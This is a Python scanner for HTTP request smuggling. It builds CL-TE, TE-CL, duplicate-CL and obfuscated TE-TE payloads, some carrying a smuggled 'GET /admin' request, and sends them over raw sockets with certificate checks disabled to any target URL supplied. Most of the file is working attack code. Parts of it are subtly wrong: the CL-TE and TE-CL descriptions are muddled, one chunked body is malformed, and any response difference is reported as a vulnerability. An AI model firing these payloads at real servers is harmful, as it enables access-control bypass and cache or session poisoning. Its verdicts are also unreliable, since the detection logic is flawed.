#!/usr/bin/env python3
"""
WEB6 — HTTP Request Smuggler
CL-TE and TE-CL detection with payload generation and diff-based analysis.
"""

import sys
import re
import time
import socket
import argparse
import ssl
import hashlib
from dataclasses import dataclass, field
from typing import List, Optional, Dict, Tuple
from urllib.parse import urlparse


@dataclass
class SmugglePayload:
    name: str
    description: str
    raw_bytes: bytes
    detection_type: str


@dataclass
class SmuggleResult:
    test_name: str
    detection_type: str
    vulnerable: bool
    evidence: str
    response_diff: Optional[str] = None
    timing_diff: Optional[float] = None


@dataclass
class AnalysisReport:
    target: str
    port: int
    uses_tls: bool
    results: List[SmuggleResult] = field(default_factory=list)
    vulnerable_te_cl: bool = False
    vulnerable_cl_te: bool = False
    vulnerable_cl_cl: bool = False
    vulnerable_te_te: bool = False


class HTTPRequestParser:
    @staticmethod
    def parse_response(raw: bytes) -> Dict:
        result = {
            "headers": {},
            "body": b"",
            "status_code": None,
            "http_version": None,
            "reason_phrase": "",
        }

        try:
            header_end = raw.find(b"\r\n\r\n")
            if header_end == -1:
                header_end = raw.find(b"\n\n")
                if header_end == -1:
                    result["body"] = raw
                    return result
                sep_len = 2
            else:
                sep_len = 4

            header_section = raw[:header_end].decode("utf-8", errors="replace")
            result["body"] = raw[header_end + sep_len:]

            lines = header_section.split("\r\n")
            if not lines:
                lines = header_section.split("\n")

            if lines:
                status_line = lines[0]
                match = re.match(r"HTTP/(\d+\.?\d*)\s+(\d+)\s*(.*)", status_line)
                if match:
                    result["http_version"] = match.group(1)
                    result["status_code"] = int(match.group(2))
                    result["reason_phrase"] = match.group(3).strip()

                for line in lines[1:]:
                    if ":" in line:
                        key, _, value = line.partition(":")
                        result["headers"][key.strip().lower()] = value.strip()
        except Exception:
            result["body"] = raw

        return result

    @staticmethod
    def build_request(
        method: str,
        path: str,
        host: str,
        headers: Optional[Dict[str, str]] = None,
        body: Optional[bytes] = None,
        http_version: str = "1.1",
    ) -> bytes:
        lines = [f"{method} {path} HTTP/{http_version}"]
        all_headers = {"Host": host}
        if headers:
            all_headers.update(headers)

        if body is not None:
            all_headers["Content-Length"] = str(len(body))

        for key, value in all_headers.items():
            lines.append(f"{key}: {value}")

        request = "\r\n".join(lines) + "\r\n\r\n"
        raw = request.encode("utf-8")

        if body:
            raw += body

        return raw


class Smuggler:
    def __init__(
        self,
        target_url: str,
        timeout: int = 10,
        verbose: bool = False,
    ):
        parsed = urlparse(target_url)
        self.target = parsed.hostname
        self.port = parsed.port or (443 if parsed.scheme == "https" else 80)
        self.uses_tls = parsed.scheme == "https"
        self.path = parsed.path or "/"
        self.timeout = timeout
        self.verbose = verbose
        self.report = AnalysisReport(
            target=self.target,
            port=self.port,
            uses_tls=self.uses_tls,
        )
        self.parser = HTTPRequestParser()

    def _connect(self) -> socket.socket:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        sock.connect((self.target, self.port))

        if self.uses_tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=self.target)

        return sock

    def _send_raw(self, raw: bytes) -> Optional[bytes]:
        try:
            sock = self._connect()
            sock.sendall(raw)

            response = b""
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                    if len(response) > 65536:
                        break
                except socket.timeout:
                    break
            sock.close()
            return response
        except (socket.timeout, ConnectionRefusedError, OSError) as e:
            if self.verbose:
                print(f"    [!] Connection error: {e}")
            return None

    def _send_raw_timed(self, raw: bytes) -> Tuple[Optional[bytes], float]:
        start = time.time()
        resp = self._send_raw(raw)
        elapsed = time.time() - start
        return resp, elapsed

    def _get_baseline(self) -> Optional[Dict]:
        req = self.parser.build_request(
            method="GET",
            path=self.path,
            host=self.target,
        )
        resp = self._send_raw(req)
        if resp:
            return self.parser.parse_response(resp)
        return None

    def generate_te_cl_payloads(self) -> List[SmugglePayload]:
        payloads = []

        smuggled_get = (
            "GET /admin HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            "\r\n"
        )

        body_te_cl = b"0\r\n\r\nGET /admin HTTP/1.1\r\nHost: " + \
            self.target.encode() + b"\r\n\r\n"

        raw = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 6\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
        ).encode() + body_te_cl

        payloads.append(SmugglePayload(
            name="TE-CL Basic",
            description="Transfer-Encoding takes precedence over Content-Length. "
                        "Front-end uses CL, back-end uses TE.",
            raw_bytes=raw,
            detection_type="TE-CL",
        ))

        body_te_cl_2 = (
            b"0\r\n"
            b"\r\n"
            b"SMUGGLED"
        )
        raw2 = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            "Content-Length: 3\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
        ).encode() + body_te_cl_2

        payloads.append(SmugglePayload(
            name="TE-CL Obfuscated",
            description="Uses chunked encoding with Transfer-Encoding header. "
                        "Front-end sees CL:3, back-end processes chunked body.",
            raw_bytes=raw2,
            detection_type="TE-CL",
        ))

        return payloads

    def generate_cl_te_payloads(self) -> List[SmugglePayload]:
        payloads = []

        smuggled = (
            f"GET /smuggled HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            "X-Injected: true\r\n"
            "\r\n"
        )

        body = b"SMUGGLE" + smuggled.encode()
        content_length = len(body)

        raw = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            f"Content-Length: {content_length}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
        ).encode() + body

        payloads.append(SmugglePayload(
            name="CL-TE Basic",
            description="Content-Length takes precedence over Transfer-Encoding. "
                        "Front-end uses CL, back-end uses TE.",
            raw_bytes=raw,
            detection_type="CL-TE",
        ))

        body2 = b"0\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: " + \
            self.target.encode() + b"\r\n\r\n"
        raw2 = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            f"Content-Length: {len(body2)}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
        ).encode() + body2

        payloads.append(SmugglePayload(
            name="CL-TE Zero-Chunk",
            description="Uses zero chunk terminator to hide smuggled request. "
                        "Front-end counts full CL, back-end stops at 0 chunk.",
            raw_bytes=raw2,
            detection_type="CL-TE",
        ))

        return payloads

    def generate_cl_cl_payloads(self) -> List[SmugglePayload]:
        payloads = []

        smuggled = (
            f"GET /admin HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            "\r\n"
        )

        inner_cl = len(smuggled.encode())
        outer_body = smuggled.encode()

        raw = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            f"Content-Length: {inner_cl}\r\n"
            "Content-Length: 200\r\n"
            "\r\n"
        ).encode() + outer_body

        payloads.append(SmugglePayload(
            name="CL-CL Duplicate",
            description="Duplicate Content-Length headers. "
                        "Different parsers may use different CL values.",
            raw_bytes=raw,
            detection_type="CL-CL",
        ))

        return payloads

    def generate_te_te_payloads(self) -> List[SmugglePayload]:
        payloads = []

        raw = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "Transfer-Encoding: identity\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
        ).encode()

        payloads.append(SmugglePayload(
            name="TE-TE Obfuscated",
            description="Duplicate Transfer-Encoding headers with obfuscation. "
                        "Parsers may disagree on which TE to use.",
            raw_bytes=raw,
            detection_type="TE-TE",
        ))

        raw2 = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.target}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "Transfer-Encoding: \x0bchunked\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
        ).encode()

        payloads.append(SmugglePayload(
            name="TE-TE Whitespace",
            description="Uses vertical tab obfuscation in second Transfer-Encoding header.",
            raw_bytes=raw2,
            detection_type="TE-TE",
        ))

        return payloads

    def _diff_responses(self, baseline: Dict, test: Dict) -> str:
        diffs = []
        if baseline.get("status_code") != test.get("status_code"):
            diffs.append(
                f"Status: {baseline.get('status_code')} -> {test.get('status_code')}"
            )
        if len(baseline.get("body", b"")) != len(test.get("body", b"")):
            diffs.append(
                f"Body length: {len(baseline.get('body', b''))} -> "
                f"{len(test.get('body', b''))}"
            )
        baseline_headers = baseline.get("headers", {})
        test_headers = test.get("headers", {})
        all_keys = set(list(baseline_headers.keys()) + list(test_headers.keys()))
        for key in sorted(all_keys):
            bval = baseline_headers.get(key, "<missing>")
            tval = test_headers.get(key, "<missing>")
            if bval != tval:
                diffs.append(f"Header '{key}': '{bval}' -> '{tval}'")

        if test.get("body", b"") != baseline.get("body", b""):
            bhash = hashlib.md5(baseline.get("body", b"")).hexdigest()[:8]
            thash = hashlib.md5(test.get("body", b"")).hexdigest()[:8]
            if bhash != thash:
                diffs.append(f"Body content changed (md5: {bhash} -> {thash})")

        return "\n".join(diffs) if diffs else "No differences detected"

    def _detect_te_cl(self, payload: SmugglePayload) -> SmuggleResult:
        print(f"\n  [*] Testing: {payload.name}")
        print(f"      Type: {payload.detection_type}")
        print(f"      {payload.description}")

        baseline = self._get_baseline()
        if not baseline:
            return SmuggleResult(
                test_name=payload.name,
                detection_type=payload.detection_type,
                vulnerable=False,
                evidence="Could not establish baseline connection",
            )

        resp_b64 = hashlib.md5(
            baseline.get("body", b"")
        ).hexdigest()[:8]

        baseline_req = self.parser.build_request(
            method="GET",
            path=self.path,
            host=self.target,
        )
        resp1, t1 = self._send_raw_timed(baseline_req)
        time.sleep(0.2)

        resp2, t2 = self._send_raw_timed(payload.raw_bytes)

        time.sleep(0.2)

        trigger_req = self.parser.build_request(
            method="GET",
            path=self.path,
            host=self.target,
        )
        resp3, t3 = self._send_raw_timed(trigger_req)

        evidence_parts = []
        vulnerable = False
        diff_str = None

        if resp2 is not None:
            parsed2 = self.parser.parse_response(resp2)
            diff_str = self._diff_responses(baseline, parsed2)

            if diff_str != "No differences detected":
                evidence_parts.append(f"Response difference detected:\n{diff_str}")
                vulnerable = True

            smuggled_body = b"SMUGGLED"
            if smuggled_body in resp2:
                evidence_parts.append("Smuggled content found in response body")
                vulnerable = True

            admin_body = b"/admin"
            if admin_body in resp2:
                evidence_parts.append("Admin path detected in response")
                vulnerable = True

        if resp3 is not None:
            parsed3 = self.parser.parse_response(resp3)
            diff3 = self._diff_responses(baseline, parsed3)
            if diff3 != "No differences detected":
                evidence_parts.append(
                    f"Second request shows desync effect:\n{diff3}"
                )
                vulnerable = True

            smuggled_check = b"SMUGGLED"
            if smuggled_check in (resp3 or b""):
                evidence_parts.append(
                    "Smuggled payload leaked into subsequent request"
                )
                vulnerable = True

        timing_diff = None
        if resp2 is not None and resp3 is not None:
            timing_diff = abs(t3 - t1)
            if timing_diff > 1.0:
                evidence_parts.append(
                    f"Timing anomaly: {timing_diff:.2f}s difference"
                )

        evidence = "\n".join(evidence_parts) if evidence_parts else "No smuggling indicators detected"

        status = "VULNERABLE" if vulnerable else "NOT VULNERABLE"
        print(f"      Result: [{status}]")
        if evidence_parts:
            for ep in evidence_parts:
                print(f"      Evidence: {ep[:120]}")

        return SmuggleResult(
            test_name=payload.name,
            detection_type=payload.detection_type,
            vulnerable=vulnerable,
            evidence=evidence,
            response_diff=diff_str,
            timing_diff=timing_diff,
        )

    def scan(self) -> AnalysisReport:
        print(f"\n{'='*60}")
        print(f"  WEB6 — HTTP Request Smuggler")
        print(f"{'='*60}")
        print(f"  Target:  {self.target}:{self.port}")
        print(f"  TLS:     {self.uses_tls}")
        print(f"  Path:    {self.path}")
        print(f"  Timeout: {self.timeout}s")
        print(f"{'='*60}\n")

        print("[*] Establishing baseline...")
        baseline = self._get_baseline()
        if baseline:
            print(f"    Baseline status: {baseline.get('status_code', 'N/A')}")
            print(f"    Baseline body:   {len(baseline.get('body', b''))} bytes")
        else:
            print("    [!] Could not establish baseline - target may be unreachable")
            print("    [*] Continuing with tests anyway...\n")

        all_payloads = []
        all_payloads.extend(self.generate_te_cl_payloads())
        all_payloads.extend(self.generate_cl_te_payloads())
        all_payloads.extend(self.generate_cl_cl_payloads())
        all_payloads.extend(self.generate_te_te_payloads())

        print(f"\n[*] Running {len(all_payloads)} detection tests...\n")

        for payload in all_payloads:
            result = self._detect_te_cl(payload)
            self.report.results.append(result)

            if result.vulnerable:
                if result.detection_type == "TE-CL":
                    self.report.vulnerable_te_cl = True
                elif result.detection_type == "CL-TE":
                    self.report.vulnerable_cl_te = True
                elif result.detection_type == "CL-CL":
                    self.report.vulnerable_cl_cl = True
                elif result.detection_type == "TE-TE":
                    self.report.vulnerable_te_te = True

        self._print_report()
        return self.report

    def _print_report(self):
        print(f"\n{'='*60}")
        print(f"  Analysis Report")
        print(f"{'='*60}")
        print(f"  Target:    {self.target}:{self.port}")
        print(f"  TLS:       {self.uses_tls}")
        print(f"{'='*60}\n")

        vuln_types = {
            "TE-CL": self.report.vulnerable_te_cl,
            "CL-TE": self.report.vulnerable_cl_te,
            "CL-CL": self.report.vulnerable_cl_cl,
            "TE-TE": self.report.vulnerable_te_te,
        }

        print("  Vulnerability Summary:")
        print("  " + "-" * 40)
        for vtype, is_vuln in vuln_types.items():
            status = "[!]" if is_vuln else "[ ]"
            print(f"    {status} {vtype}")
        print()

        print("  Detailed Results:")
        print("  " + "-" * 40)
        for result in self.report.results:
            status = "VULN" if result.vulnerable else "SAFE"
            print(f"    [{status}] {result.test_name}")
            if result.vulnerable:
                evidence_lines = result.evidence.split("\n")
                for line in evidence_lines[:3]:
                    print(f"           {line}")
            if result.timing_diff:
                print(f"           Timing diff: {result.timing_diff:.2f}s")
        print()

        any_vuln = any(vuln_types.values())
        if any_vuln:
            print("  [!] VULNERABLE — HTTP Request Smuggling detected!")
            print("  [!] The target server may be susceptible to request")
            print("      smuggling attacks. Review findings above.")
        else:
            print("  [+] NOT VULNERABLE — No smuggling indicators detected.")
            print("  [+] The target appears to handle ambiguous requests correctly.")

        print(f"\n{'='*60}\n")


def main():
    parser = argparse.ArgumentParser(
        description="WEB6 — HTTP Request Smuggler",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Example: python3 smuggler.py https://target.com --timeout 10",
    )
    parser.add_argument("target", help="Target URL (e.g. http://target.com or https://target.com)")
    parser.add_argument("--timeout", type=int, default=10,
                        help="Connection timeout in seconds (default: 10)")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Verbose output")

    args = parser.parse_args()

    smuggler = Smuggler(
        target_url=args.target,
        timeout=args.timeout,
        verbose=args.verbose,
    )

    try:
        smuggler.scan()
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user")
        sys.exit(1)


if __name__ == "__main__":
    main()
